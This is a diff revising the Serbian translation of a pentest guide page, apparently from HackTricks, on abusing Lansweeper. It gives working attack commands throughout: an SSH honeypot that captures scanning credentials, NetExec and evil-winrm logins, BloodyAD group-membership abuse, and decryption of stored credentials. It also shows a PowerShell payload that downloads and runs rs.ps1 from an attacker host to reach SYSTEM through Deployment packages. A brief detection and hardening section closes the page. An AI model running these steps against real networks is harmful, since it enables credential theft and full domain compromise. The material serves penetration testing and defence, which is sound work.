@@ -1,21 +1,21 @@
-# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE
+# Lansweeper Zloupotreba: Credential Harvesting, Secrets Decryption, and Deployment RCE
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Lansweeper je platforma za otkrivanje i inventar IT imovine često postavljena na Windows i integrisana sa Active Directory. Kredencijali konfigurisani u Lansweeper-u koriste se od strane njegovih scanning engines da se autentifikuju na asset-e preko protokola kao što su SSH, SMB/WMI i WinRM. Pogrešne konfiguracije često dozvoljavaju:
+Lansweeper je platforma za otkrivanje i inventar IT resursa koja se često postavlja na Windows i integriše sa Active Directory. Kredencijali konfigurisani u Lansweeperu koriste njegovi skeneri za autentifikaciju na resurse preko protokola kao što su SSH, SMB/WMI i WinRM. Pogrešne konfiguracije često omogućavaju:
 
-- Presretanje kredencijala preusmeravanjem scanning target-a na host kojim kontroliše napadač (honeypot)
-- Zloupotrebu AD ACLs izloženih od strane Lansweeper-related groups da bi se stekao udaljeni pristup
-- Dešifrovanje Lansweeper-konfigurisанih tajni na hostu (connection strings i sačuvani scanning credentials)
-- Izvršavanje koda na managed endpoints preko Deployment feature-a (često pokreće kao SYSTEM)
+- Credential interception preusmeravanjem Scanning Target na host kojim kontroliše napadač (honeypot)
+- Zloupotrebu AD ACLs izloženih od strane grupa povezanih sa Lansweeper-om kako bi se stekao daljinski pristup
+- Dekriptovanje na hostu tajni konfigurisanim u Lansweeperu (connection strings i sačuvani scanning credentials)
+- Code execution na upravljanim endpoint-ima preko Deployment feature (često se izvršava kao SYSTEM)
 
-Ova stranica sumira praktične toka napadača i komande za zloupotrebu ovih ponašanja tokom engagement-a.
+Ova stranica sumira praktične tokove rada napadača i komande za zloupotrebu ovih ponašanja tokom angažmana.
 
 ## 1) Harvest scanning credentials via honeypot (SSH example)
 
-Idea: kreirajte Scanning Target koji pokazuje na vaš host i mapirajte postojeće Scanning Credentials na njega. Kada scan pokrene, Lansweeper će pokušati da se autentifikuje tim kredencijalima, i vaš honeypot će ih uhvatiti.
+Ideja: kreirajte Scanning Target koji pokazuje na vaš host i povežite postojeće Scanning Credentials sa njim. Kada se scan pokrene, Lansweeper će pokušati da se autentifikuje tim kredencijalima, a vaš honeypot će ih zabeležiti.
 
-Pregled koraka (web UI):
+Steps overview (web UI):
 - Scanning → Scanning Targets → Add Scanning Target
 - Type: IP Range (or Single IP) = your VPN IP
 - Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
@@ -39,7 +39,7 @@ sshesame --config sshesame.conf
 # authentication for user "svc_inventory_lnx" with password "<password>" accepted
 # connection with client version "SSH-2.0-RebexSSH_5.0.x" established
 ```
-Proverite uhvaćene creds na DC servisima:
+Proverite captured creds protiv DC services:
 ```bash
 # SMB/LDAP/WinRM checks (NetExec)
 netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
@@ -47,12 +47,12 @@ netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
 Notes
-- Works similarly for other protocols when you can coerce the scanner to your listener (SMB/WinRM honeypots, etc.). SSH is often the simplest.
-- Many scanners identify themselves with distinct client banners (e.g., RebexSSH) and will attempt benign commands (uname, whoami, etc.).
+- Radi slično i za druge protokole kada možete primorati skener da se poveže na vaš listener (SMB/WinRM honeypots, itd.). SSH je često najjednostavniji.
+- Mnogi skeneri se identifikuju posebnim client bannerima (npr. RebexSSH) i pokušavaće benignim komandama (uname, whoami, itd.).
 
-## 2) AD ACL abuse: osvojite udaljeni pristup dodavanjem sebe u app-admin grupu
+## 2) AD ACL abuse: dobijte daljinski pristup tako što ćete sebe dodati u app-admin group
 
-Koristite BloodHound za enumeraciju efektivnih prava kompromitovanog naloga. Čest nalaz je grupa specifična za scanner ili aplikaciju (npr. “Lansweeper Discovery”) koja ima GenericAll nad privilegovanom grupom (npr. “Lansweeper Admins”). Ako je privilegovana grupa takođe član “Remote Management Users”, WinRM postaje dostupan čim sebe dodamo.
+Koristite BloodHound za enumeraciju effective rights sa kompromitovanog naloga. Uobičajen nalaz je grupa specifična za skener ili aplikaciju (npr. “Lansweeper Discovery”) koja ima GenericAll nad privilegovanim grupom (npr. “Lansweeper Admins”). Ako je privilegovana grupa takođe član “Remote Management Users”, WinRM postaje dostupan nakon što sebe dodamo.
 
 Collection examples:
 ```bash
@@ -62,7 +62,7 @@ netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhoun
 # RustHound-CE collection (zip for BH CE import)
 rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
 ```
-Eksploatacija GenericAll na grupi pomoću BloodyAD (Linux):
+Exploit GenericAll na grupi pomoću BloodyAD (Linux):
 ```bash
 # Add our user into the target group
 bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
@@ -71,24 +71,24 @@ add groupMember "Lansweeper Admins" svc_inventory_lnx
 # Confirm WinRM access if the group grants it
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-Zatim dobijte interaktivni shell:
+Zatim dobijte interactive shell:
 ```bash
 evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-Tip: Kerberos operacije su vremenski osetljive. Ako dobijete KRB_AP_ERR_SKEW, prvo sinhronizujte vreme sa DC:
+Savet: Kerberos operacije su zavisne od vremena. Ako dobijete KRB_AP_ERR_SKEW, prvo sinhronizujte vreme sa DC:
 ```bash
 sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
 ```
-## 3) Dekriptirajte tajne koje je Lansweeper konfigurisao na hostu
+## 3) Decrypt Lansweeper-configured secrets on the host
 
-Na Lansweeper serveru, ASP.NET sajt obično čuva šifrovani connection string i simetrični ključ koji aplikacija koristi. Uz odgovarajući lokalni pristup možete dešifrovati DB connection string i potom izvući sačuvane kredencijale za skeniranje.
+Na Lansweeper serveru, ASP.NET sajt obično čuva encrypted connection string i simetrični ključ koji aplikacija koristi. Sa odgovarajućim lokalnim pristupom možete decrypt DB connection string i zatim izvući stored scanning credentials.
 
 Tipične lokacije:
 - Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
 - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
-- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
+- Ključ aplikacije: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
 
-Koristite SharpLansweeperDecrypt za automatizaciju dešifrovanja i izvlačenja sačuvanih kredencijala:
+Koristite SharpLansweeperDecrypt to automate decryption and dumping of stored creds:
 ```powershell
 # From a WinRM session or interactive shell on the Lansweeper host
 # PowerShell variant
@@ -99,26 +99,26 @@ powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
 #  - Connect to Lansweeper DB
 #  - Decrypt stored scanning credentials and print them in cleartext
 ```
-Očekivani izlaz uključuje DB connection details i plaintext scanning credentials, kao što su Windows i Linux nalozi koji se koriste širom okruženja. Oni često imaju povišena lokalna prava na hostovima u domeni:
+Očekivani izlaz uključuje DB detalje za konekciju i plaintext kredencijale za skeniranje, kao što su Windows i Linux nalozi koji se koriste širom infrastrukture. Oni često imaju povišena lokalna prava na hostovima u domeni:
 ```text
 Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
 Inventory Linux    svc_inventory_lnx        <StrongPassword!>
 ```
-Iskoristi povraćene Windows scanning creds za privilegovan pristup:
+Iskoristite vraćene Windows scanning creds za privilegovani pristup:
 ```bash
 netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
 # Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
 ```
 ## 4) Lansweeper Deployment → SYSTEM RCE
 
-Kao član “Lansweeper Admins”, web UI izlaže Deployment i Configuration. Pod Deployment → Deployment packages, možete kreirati pakete koji izvršavaju proizvoljne komande na ciljnim asset-ima. Izvršenje obavlja Lansweeper service sa visokim privilegijama, što rezultuje izvršavanjem koda kao NT AUTHORITY\SYSTEM na odabranom hostu.
+Kao član “Lansweeper Admins”, web UI izlaže Deployment i Configuration. Pod Deployment → Deployment packages, možete napraviti pakete koji pokreću proizvoljne komande na ciljnim asset-ima. Izvršenje obavlja Lansweeper service sa visokim privilegijama, što daje code execution kao NT AUTHORITY\SYSTEM na izabranom hostu.
 
-High-level steps:
+Glavni koraci:
 - Kreirajte novi Deployment package koji pokreće PowerShell ili cmd one-liner (reverse shell, add-user, itd.).
 - Ciljajte željeni asset (npr. DC/host gde Lansweeper radi) i kliknite Deploy/Run now.
-- Uhvatite svoj shell kao SYSTEM.
+- Uhvatite shell kao SYSTEM.
 
-Example payloads (PowerShell):
+Primer payloads (PowerShell):
 ```powershell
 # Simple test
 powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"
@@ -127,18 +127,18 @@ powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"
 powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
 ```
 OPSEC
-- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Use judiciously.
+- Operacije deploy-a su bučne i ostavljaju zapise u Lansweeper i Windows event logovima. Koristite ih pažljivo.
 
 ## Detekcija i hardening
 
-- Ograničite ili uklonite anonimne SMB enumeracije. Monitorirajte za RID cycling i anomalne pristupe Lansweeper share-ovima.
-- Kontrole izlaza: blokirajte ili strogo ograničite outbound SSH/SMB/WinRM sa scanner hostova. Upozorite na nestandardne portove (npr. 2022) i neuobičajene client bannere poput Rebex.
-- Protect `Website\\web.config` and `Key\\Encryption.txt`. Externalizujte secrets u vault i rotirajte pri izlaganju. Razmotrite servisne naloge sa minimalnim privilegijama i gMSA gde je izvodljivo.
-- AD monitoring: alarmirajte na promene u Lansweeper-related grupama (npr. “Lansweeper Admins”, “Remote Management Users”) i na ACL izmene koje dodeljuju GenericAll/Write članstvo privilegovanim grupama.
-- Audit Deployment package creations/changes/executions; alarmirajte na pakete koji pokreću cmd.exe/powershell.exe ili neočekivane outbound konekcije.
+- Ograničite ili uklonite anonimno SMB enumerisanje. Pratite RID cycling i anomalni pristup Lansweeper deljenjima.
+- Kontrola izlaznog saobraćaja: blokirajte ili strogo ograničite outbound SSH/SMB/WinRM sa scanner hostova. Upozoravajte na nestandardne portove (npr. 2022) i neuobičajene client bannere kao Rebex.
+- Zaštitite `Website\\web.config` i `Key\\Encryption.txt`. Eksternalizujte tajne u vault i rotirajte ih u slučaju izlaganja. Razmotrite servisne naloge sa minimalnim privilegijama i gMSA gde je moguće.
+- AD monitoring: upozoravajte na promene u grupama vezanim za Lansweeper (npr. “Lansweeper Admins”, “Remote Management Users”) i na promene ACL-a koje dodeljuju GenericAll/Write članstvo u privilegovanim grupama.
+- Audit-ujte kreiranje/izmene/izvršavanje Deployment paketa; upozoravajte na pakete koji pokreću cmd.exe/powershell.exe ili na neočekivane outbound konekcije.
 
 ## Povezane teme
-- SMB/LSA/SAMR enumeration and RID cycling
+- SMB/LSA/SAMR enumeracija i RID cycling
 - Kerberos password spraying and clock skew considerations
 - BloodHound path analysis of application-admin groups
 - WinRM usage and lateral movement
